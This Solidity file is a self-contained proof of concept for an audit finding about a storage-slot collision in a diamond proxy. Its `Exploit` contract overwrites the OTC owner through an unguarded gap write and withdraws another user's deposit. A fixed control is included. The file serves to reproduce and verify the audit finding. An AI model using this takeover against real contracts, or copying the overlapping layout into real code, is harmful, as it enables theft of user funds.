// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gains Network — PriceAggregatorStorage overlaps OtcStorage
    (Pashov Audit Group, July 2024, finding H-01).

    jobIds is bytes32[2], two slots, not 64 bits. The struct is stored at
    slot 551 and is 52 slots long, so its last two words are slots 601 and
    602. OtcStorage starts at 601. Writing gap[48] replaces the OTC owner.
    The caller then withdraws the 1000 balance.

    The control starts OtcStorage at 603. The same write does not change the
    owner, and the caller cannot withdraw. run() does not warp. */

contract CollToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Diamond {
    uint256 internal constant GLOBAL_PRICE_AGGREGATOR_SLOT = 551;
    uint256 internal constant GLOBAL_OTC_SLOT = 601;

    struct PriceAggregatorStorage {
        address linkUsdPriceFeed;
        uint24 twapInterval;
        uint8 minAnswers;
        bytes32[2] jobIds;
        uint256[49] __gap;
    }

    struct OtcStorage {
        uint256 balance;
        address owner;
    }

    CollToken public token;

    constructor(CollToken token_) {
        token = token_;
    }

    function _agg() internal pure returns (PriceAggregatorStorage storage s) {
        uint256 slot = GLOBAL_PRICE_AGGREGATOR_SLOT;
        assembly {
            s.slot := slot
        }
    }

    function _otc() internal pure returns (OtcStorage storage s) {
        uint256 slot = GLOBAL_OTC_SLOT;
        assembly {
            s.slot := slot
        }
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        OtcStorage storage o = _otc();
        o.balance += amount;
        if (o.owner == address(0)) o.owner = msg.sender;
    }

    function writeTail(uint256 index, uint256 value) external {
        PriceAggregatorStorage storage p = _agg();
        // @> VULN: gap[48] is slot 602, which is OtcStorage.owner
        p.__gap[index] = value;
    }

    function withdraw() external returns (uint256 amount) {
        OtcStorage storage o = _otc();
        require(o.owner == msg.sender, "owner");
        amount = o.balance;
        o.balance = 0;
        token.transfer(msg.sender, amount);
    }

    function owner() external view returns (address) {
        return _otc().owner;
    }

    function balance() external view returns (uint256) {
        return _otc().balance;
    }
}

contract DiamondFixed {
    uint256 internal constant GLOBAL_PRICE_AGGREGATOR_SLOT = 551;
    uint256 internal constant GLOBAL_OTC_SLOT = 603;

    struct PriceAggregatorStorage {
        address linkUsdPriceFeed;
        uint24 twapInterval;
        uint8 minAnswers;
        bytes32[2] jobIds;
        uint256[49] __gap;
    }

    struct OtcStorage {
        uint256 balance;
        address owner;
    }

    CollToken public token;

    constructor(CollToken token_) {
        token = token_;
    }

    function _agg() internal pure returns (PriceAggregatorStorage storage s) {
        uint256 slot = GLOBAL_PRICE_AGGREGATOR_SLOT;
        assembly {
            s.slot := slot
        }
    }

    function _otc() internal pure returns (OtcStorage storage s) {
        uint256 slot = GLOBAL_OTC_SLOT;
        assembly {
            s.slot := slot
        }
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        OtcStorage storage o = _otc();
        o.balance += amount;
        if (o.owner == address(0)) o.owner = msg.sender;
    }

    function writeTail(uint256 index, uint256 value) external {
        _agg().__gap[index] = value;
    }

    function withdraw() external returns (uint256 amount) {
        OtcStorage storage o = _otc();
        require(o.owner == msg.sender, "owner");
        amount = o.balance;
        o.balance = 0;
        token.transfer(msg.sender, amount);
    }

    function owner() external view returns (address) {
        return _otc().owner;
    }
}

contract User {
    function fund(Diamond diamond, CollToken token, uint256 amount) external {
        token.approve(address(diamond), amount);
        diamond.deposit(amount);
    }
}

contract UserFixed {
    function fundFixed(DiamondFixed diamond, CollToken token, uint256 amount) external {
        token.approve(address(diamond), amount);
        diamond.deposit(amount);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public constant TAIL = 48;

    CollToken public token;
    Diamond public diamond;
    User public user;
    uint256 public taken;

    constructor() {
        token = new CollToken();
        diamond = new Diamond(token);
        user = new User();
        token.mint(address(user), AMOUNT);
    }

    function run() external {
        user.fund(diamond, token, AMOUNT);
        diamond.writeTail(TAIL, uint256(uint160(address(this))));
        taken = diamond.withdraw();
        require(diamond.owner() == address(this), "owner");
        require(taken == AMOUNT, "taken");
        require(token.balanceOf(address(this)) == AMOUNT, "balance");
    }
}
